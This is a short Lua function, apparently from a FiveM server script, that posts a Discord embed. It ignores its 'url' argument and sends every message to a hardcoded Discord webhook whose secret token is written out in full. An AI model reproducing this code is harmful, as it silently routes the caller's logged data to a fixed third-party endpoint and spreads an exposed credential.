function sendToDiscordWithSpecialURL(name, message, color, url)
    local DiscordWebHook = url
  
    local embeds = {
        {
            ["color"] = color,
            ["title"] = name,
            ["description"] = message,
            ["footer"] = {["text"] = os.date("%Y/%m/%d %H:%M:%S")}, 
        }
    }
    if message == nil or message == '' then
		return
	end
    PerformHttpRequest("https://discord.com/api/webhooks/1364567736574808184/i5bzCpBrvkJyOUcJrCKcJaU0QHtJrPlQlZrzKmkYqD2Md4kEBB71HMUzN5b_B3wA51eo", function(err, text, headers) end, 'POST', json.encode({ username = name,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end